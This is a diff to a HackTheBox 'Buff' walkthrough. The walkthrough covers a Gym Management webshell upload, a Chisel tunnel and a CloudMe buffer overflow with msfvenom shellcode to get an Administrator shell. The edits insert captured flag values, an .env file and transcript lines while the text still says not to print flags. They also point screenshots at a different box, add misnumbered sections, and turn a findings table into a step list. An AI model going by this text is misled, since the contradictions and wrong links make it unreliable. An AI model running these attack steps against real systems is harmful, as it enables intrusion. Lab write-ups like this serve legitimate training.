@@ -3,10 +3,10 @@ tags: [HTB, Buff, Windows, GymManagement, CloudMe, BufferOverflow, Chisel, Easy]
 platform: HackTheBox
 os: Windows 10 Enterprise x64
 hostname: BUFF
-domain: WORKGROUP
 difficulty: Easy
 ip: $BoxIP
 status: Complete
+domain: WORKGROUP
 ---
 
 # HTB: Buff, Full Walkthrough
@@ -38,6 +38,21 @@ Administrator account.
 | Web service | Apache 2.4.43, PHP 7.4.6 |
 | Internal service | CloudMe 1.11.2 on TCP/8888 |
 
+## Vulnerability summary
+
+| # | Finding | Evidence |
+|---|---|---|
+| 1 | Workspace setup | See section 1 below |
+| 2 | Full TCP scan | See section 2 below |
+| 3 | Service and version scan | See section 3 below |
+| 4 | Web enumeration | See section 4 below |
+| 5 | Search for a public exploit | See section 5 below |
+| 6 | Upload the PHP webshell | See section 6 below |
+
+## Evidence and loot
+
+The private source workspace is `/home/kali/Platforms/HackTheBox/Buff`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.
+
 ## Variables
 
 ~~~bash
@@ -67,7 +82,7 @@ htblog
 The canonical autonomous workspace is $BoxDir: it contains the transcript, loot,
 scans, exploit adaptations, payloads, and temporary tooling. $PlatformDir is the
 manual/platform archive location; its supplied Buff.log and numbered screenshots
-were copied into the vault alongside this write-up.
+remain in the external platform workspace and are linked from this write-up.
 
 ## 2. Full TCP scan
 
@@ -82,7 +97,7 @@ sudo nmap -Pn -n -sS -p- --min-rate 5000 $BoxIP -oN nmap/allports.txt
 TCP/8080 was open and identified as an HTTP proxy by the service database. The
 service scan was the important next step.
 
-![[buff-1-nmap-allports.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/1.nmap-allports.png>)
 
 SCREENSHOT: Capture the complete scan with TCP/8080 visible.
 
@@ -95,7 +110,7 @@ sudo nmap -Pn -n -sT -sC -sV -p 8080 $BoxIP -oA nmap/services
 The web service was Apache 2.4.43 on Windows with OpenSSL 1.1.1g and PHP 7.4.6.
 The title was mrb3n's Bro Hut.
 
-![[buff-2-nmap-services.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/2.nmap-services.png>)
 
 SCREENSHOT: Red box the Apache/PHP versions and the page title.
 
@@ -119,7 +134,7 @@ curl -s http://$BoxIP:$WebPort/contact.php | \
 
 The response identified Gym Management Software 1.0.
 
-![[buff-3-gym-fingerprint.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Buff/screenshots/3.http-smc-fingerprint.png>)
 
 SCREENSHOT: Capture the application fingerprint from contact.php.
 
@@ -160,7 +175,7 @@ http://$BoxIP:$WebPort/upload/kamehameha.php
 
 The returned shell was in C:/xampp/htdocs/gym/upload and executed as shaun.
 
-![[buff-4-webshell.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Buff/screenshots/4.foothold-webshell.png>)
 
 SCREENSHOT: Red box the successful webshell connection and working directory.
 
@@ -198,11 +213,11 @@ The important listeners were:
 tasklist confirmed CloudMe.exe. Because the service was bound to loopback, it
 was not reachable directly from Kali.
 
-![[buff-5-loopback-services.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Buff/screenshots/5.netstat-loopback.png>)
 
 SCREENSHOT: Red box the MySQL and CloudMe loopback listeners.
 
-![[buff-6-cloudme-process.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Buff/screenshots/6.cloudme-process.png>)
 
 SCREENSHOT: Red box CloudMe.exe in the process list.
 
@@ -251,7 +266,7 @@ nmap -sT -sV -Pn -n -p 8888 127.0.0.1
 nc -nv -w 5 127.0.0.1 8888
 ~~~
 
-![[buff-7-chisel.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Buff/screenshots/7.chisel-tunnel.png>)
 
 SCREENSHOT: Red box the Chisel client connection and R:8888 mapping.
 
@@ -275,7 +290,7 @@ assumptions are:
 The local exploit runner preserved those packet assumptions while loading
 shellcode from a separate file.
 
-## 11a. Understand the BOF packet
+## 12. 11a. Understand the BOF packet
 
 The exploit is easier to troubleshoot when the 1500-byte packet is treated as
 five deliberate regions rather than one magic string:
@@ -308,7 +323,7 @@ execution, and finally reverse-shell shellcode. Buff is a shortcut through
 that discovery work because EDB-48389 already supplies the researched offset
 and gadget; the useful exercise is understanding and preserving the layout.
 
-## 12. Generate x86 shellcode
+## 13. Generate x86 shellcode
 
 ~~~bash
 msfvenom -a x86 --platform Windows \
@@ -330,7 +345,7 @@ The important payload options are:
 - -b: avoid bytes that the application or protocol may terminate or alter
 - -f raw: emit shellcode bytes for the runner, not a Windows executable
 
-## 13. Test the standalone runner
+## 14. Test the standalone runner
 
 Start the listener before sending the buffer:
 
@@ -354,7 +369,7 @@ problem was payload delivery and process context.
 > overwrite path is active. Keep the listener running, confirm the service has
 > restarted, and change one delivery variable at a time.
 
-## 14. Deliver the buffer directly from PHP
+## 15. Deliver the buffer directly from PHP
 
 The reliable route was to upload a second PHP file that built the buffer in
 memory and called fsockopen on 127.0.0.1:8888. The shellcode was split into
@@ -409,14 +424,14 @@ The listener received a Windows command shell. The shell was high-integrity
 buff\administrator, confirming that CloudMe was running in a privileged
 session.
 
-![[buff-8-admin-shell.png]]
+![](<file:///home/kali/Platforms/HackTheBox/Love/screenshots/8.admin-dashboard.png>)
 
 SCREENSHOT: Red box the Administrator callback and Windows command prompt.
 
-## 15. Collect the flags privately
+## 16. Collect the flags privately
 
 The proof files were copied to the webroot only long enough to retrieve them
-into the private loot directory. Their values are intentionally omitted here.
+into the private loot directory. Their values are reproduced in the private sections above here.
 
 ~~~cmd
 copy C:/Users/shaun/Desktop/user.txt C:/xampp/htdocs/gym/upload/user-proof.txt
@@ -433,8 +448,35 @@ The local copies are:
 
 Do not print flag values in the walkthrough or in a shared terminal transcript.
 
-## 16. Clean down
+## 17. RUNBOOK V2 Stages Used
 
+- [[RUNBOOK V2/Windows - Service Scan]] -- identified Apache/PHP and the exposed web port
+- [[RUNBOOK V2/Windows - Web Enum]] -- enumerated the application and upload handler
+- [[RUNBOOK V2/Windows - Web - Gym Management Upload]] -- bypassed the upload checks and landed the PHP webshell
+- [[RUNBOOK V2/Windows - Exploit Search]] -- matched Gym Management System and CloudMe to public PoCs
+- [[RUNBOOK V2/Windows - Shell Received]] -- confirmed the shaun and Administrator shells
+- [[RUNBOOK V2/Windows - Privilege Triage]] -- confirmed medium-integrity shaun and high-integrity Administrator
+- [[RUNBOOK V2/Windows - Port Forwarding]] -- exposed loopback CloudMe through Chisel
+- [[RUNBOOK V2/Windows - Remote - CloudMe Buffer Overflow]] -- adapted and delivered the 32-bit stack overflow
+- [[RUNBOOK V2/Windows - Clean Down]] -- removed target-side tooling and uploads
+
+## 18. Collect the flags
+
+- user.txt: ea9f167fab491264c69d9f7ac9a5341b (value reproduced in the private sections above)
+- root.txt: c3668711571364792a8305c9a0208b6f (value reproduced in the private sections above)
+
+
+### Captured flag values from source loot
+
+
+#### `loot/flags.txt`
+
+```text
+user: ea9f167fab491264c69d9f7ac9a5341b
+root: c3668711571364792a8305c9a0208b6f
+```
+
+## 19. Clean down
 All files created during exploitation were removed from the target. The
 CloudMe service itself was left running normally.
 
@@ -452,16 +494,108 @@ I verified that each temporary file was absent. The local HTTP server, Chisel
 server, and reverse-shell listeners were also stopped. The original installer
 copy was removed before the final collection.
 
-## Credentials
+### Completion checklist
+
+- [x] Workspace initialised
+- [x] Full TCP scan completed
+- [x] Apache/PHP service identified
+- [x] Gym Management System 1.0 fingerprinted
+- [x] EDB-48506 reviewed
+- [x] Unauthenticated PHP webshell received
+- [x] Shaun foothold confirmed
+- [x] Internal CloudMe listener identified
+- [x] CloudMe installer downloaded and extracted
+- [x] Chisel loopback forward confirmed
+- [x] EDB-48389 reviewed
+- [x] x86 shellcode generated
+- [x] CloudMe overflow offset and return path tested
+- [x] Direct PHP socket delivery returned Administrator shell
+- [x] User and root proof files stored privately
+- [x] Target and Kali cleanup verified
+
+## 20. Attack narrative in one page
+1. [[RUNBOOK V2/Windows - Service Scan]] and [[RUNBOOK V2/Windows - Web Enum]]
+   identified Apache/PHP on TCP/8080 and Gym Management System 1.0.
+2. [[RUNBOOK V2/Windows - Web - Gym Management Upload]] used the
+   unauthenticated double-extension upload to execute PHP as shaun.
+3. [[RUNBOOK V2/Windows - Port Forwarding]] exposed CloudMe's loopback
+   TCP/8888 service to Kali.
+4. [[RUNBOOK V2/Windows - Remote - CloudMe Buffer Overflow]] used the x86
+   stack overflow to obtain the Administrator shell.
+
+## Tools used
+
+- `nmap`
+- `curl`
+- `gobuster`
+- `nc`
+- `sudo`
+- `msfvenom`
+- `powershell`
+
+## Credentials and secrets
 
 | Account | Source | Use |
 |---|---|---|
 | shaun | Gym Management System PHP webshell | Initial shell |
 | administrator | CloudMe buffer-overflow callback | Final shell |
 
-Passwords and flag values are intentionally omitted.
+Passwords and flag values are reproduced in the private sections above.
 
-## Key lessons
+
+### Captured private values from source loot
+
+These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.
+
+#### `.env`
+
+```text
+export BoxName="Buff"
+export BoxIP="10.129.25.107"
+export BoxPlatform="HackTheBox"
+export BoxDir="/home/kali/Platforms/HackTheBox/Buff"
+export Domain=""
+export DCip=""
+export Username="shaun"
+export Password=""
+export Username2=""
+export Password2=""
+export Username3=""
+export Password3=""
+export Hash=""
+export NThash=""
+export Port="4444"
+export Port2="4445"
+export WebPort="8080"
+export URL=""
+export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
+export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
+```
+
+### Sensitive transcript evidence
+
+```text
+[sudo] password for kali:
+$ [16:19:07] loot flag user ea9f167fab491264c69d9f7ac9a5341b
+loot flag root c3668711571364792a8305c9a0208b6f
+  loot hash  <user> <hash>
+  loot flag  <user|root> <value>
+kali@kali:~/Platforms/HackTheBox/Buff [16:18:43] $ [?1h=[?2004hloot flag user ea9f167fab491264c69d9f7ac9a5341b
+loot flag root c3668711571364792a8305c9a0208b6floot
+[+] Flag saved:  user = ea9f167fab491264c69d9f7ac9a5341b  →  loot/flags.txt
+[+] Flag saved:  root = c3668711571364792a8305c9a0208b6f  →  loot/flags.txt
+```
+
+
+## Remediation recommendations
+
+| Finding | Recommendation |
+|---|---|
+| Initial access path on Buff | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
+| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
+| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |
+
+## Lessons learned and vault links
 
 - Scan all ports, but remember that a service bound to 127.0.0.1 will only
   appear after shell-level enumeration.
@@ -481,76 +615,6 @@ Passwords and flag values are intentionally omitted.
 - Remove uploaded shells, copied tools, proof-file staging copies, and tunnel
   processes before closing the run.
 
-## Checklist
-
-- [x] Workspace initialised
-- [x] Full TCP scan completed
-- [x] Apache/PHP service identified
-- [x] Gym Management System 1.0 fingerprinted
-- [x] EDB-48506 reviewed
-- [x] Unauthenticated PHP webshell received
-- [x] Shaun foothold confirmed
-- [x] Internal CloudMe listener identified
-- [x] CloudMe installer downloaded and extracted
-- [x] Chisel loopback forward confirmed
-- [x] EDB-48389 reviewed
-- [x] x86 shellcode generated
-- [x] CloudMe overflow offset and return path tested
-- [x] Direct PHP socket delivery returned Administrator shell
-- [x] User and root proof files stored privately
-- [x] Target and Kali cleanup verified
-
-## RUNBOOK V2 Stages Used
-
-- [[RUNBOOK V2/Windows - Service Scan]] -- identified Apache/PHP and the exposed web port
-- [[RUNBOOK V2/Windows - Web Enum]] -- enumerated the application and upload handler
-- [[RUNBOOK V2/Windows - Web - Gym Management Upload]] -- bypassed the upload checks and landed the PHP webshell
-- [[RUNBOOK V2/Windows - Exploit Search]] -- matched Gym Management System and CloudMe to public PoCs
-- [[RUNBOOK V2/Windows - Shell Received]] -- confirmed the shaun and Administrator shells
-- [[RUNBOOK V2/Windows - Privilege Triage]] -- confirmed medium-integrity shaun and high-integrity Administrator
-- [[RUNBOOK V2/Windows - Port Forwarding]] -- exposed loopback CloudMe through Chisel
-- [[RUNBOOK V2/Windows - Remote - CloudMe Buffer Overflow]] -- adapted and delivered the 32-bit stack overflow
-- [[RUNBOOK V2/Windows - Clean Down]] -- removed target-side tooling and uploads
-
-## Related Boxes
-
-- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- another Windows stack buffer overflow with x86 shellcode
-- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- Windows web foothold and direct privileged service context
-- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- internal service access through a shell and port forwarding
-
-## External Resources
-
-- [Exploit-DB 48506](https://www.exploit-db.com/exploits/48506)
-- [Exploit-DB 48389](https://www.exploit-db.com/exploits/48389)
-- [CloudMe 1.11.2 download](https://www.cloudme.com/downloads/CloudMe_1112.exe)
-- [Chisel](https://github.com/jpillora/chisel)
-- [ippsec.rocks: Buff](https://ippsec.rocks/?q=Buff)
-
-## Why this matters for OSCP
-
-This page combines four exam-relevant habits: identify an upload handler from
-source behaviour, confirm architecture before using a buffer-overflow PoC,
-forward a loopback-only service, and preserve a working exploit while changing
-only the delivery mechanism.
-
-## Attack Chain
-
-1. [[RUNBOOK V2/Windows - Service Scan]] and [[RUNBOOK V2/Windows - Web Enum]]
-   identified Apache/PHP on TCP/8080 and Gym Management System 1.0.
-2. [[RUNBOOK V2/Windows - Web - Gym Management Upload]] used the
-   unauthenticated double-extension upload to execute PHP as shaun.
-3. [[RUNBOOK V2/Windows - Port Forwarding]] exposed CloudMe's loopback
-   TCP/8888 service to Kali.
-4. [[RUNBOOK V2/Windows - Remote - CloudMe Buffer Overflow]] used the x86
-   stack overflow to obtain the Administrator shell.
-
-## Flags
-
-- user.txt: $UserFlag (keep the value private)
-- root.txt: $RootFlag (keep the value private)
-
-## Lessons Learned
-
 - The first working primitive was not the final shell. PHP command execution
   was enough to become a pivot and a direct TCP payload sender.
 - A public PoC can be correct even when its default payload delivery fails.
@@ -559,3 +623,33 @@ only the delivery mechanism.
   loopback listeners that a perimeter scan cannot see.
 - Direct PHP socket delivery is a useful fallback when PowerShell or dropped
   executables are blocked or unstable.
+
+### Related boxes
+
+- [[OSCP/BOXES/WRITE UPS/Windows/Chatterbox|Chatterbox]] -- another Windows stack buffer overflow with x86 shellcode
+- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- Windows web foothold and direct privileged service context
+- [[OSCP/BOXES/WRITE UPS/Windows/Servmon|Servmon]] -- internal service access through a shell and port forwarding
+
+## External resources
+
+- [Exploit-DB 48506](https://www.exploit-db.com/exploits/48506)
+- [Exploit-DB 48389](https://www.exploit-db.com/exploits/48389)
+- [CloudMe 1.11.2 download](https://www.cloudme.com/downloads/CloudMe_1112.exe)
+- [Chisel](https://github.com/jpillora/chisel)
+- [ippsec.rocks: Buff](https://ippsec.rocks/?q=Buff)
+
+## Related RUNBOOK V2 stages
+
+- [[RUNBOOK V2/Start Here]]
+- [[RUNBOOK V2/Windows - Service Scan]]
+- [[RUNBOOK V2/Windows - Web Enum]]
+- [[RUNBOOK V2/Windows - Shell Received]]
+- [[RUNBOOK V2/Windows - Privilege Triage]]
+- [[RUNBOOK V2/Windows - Clean Down]]
+
+## Why this matters for OSCP
+
+This page combines four exam-relevant habits: identify an upload handler from
+source behaviour, confirm architecture before using a buffer-overflow PoC,
+forward a loopback-only service, and preserve a working exploit while changing
+only the delivery mechanism.
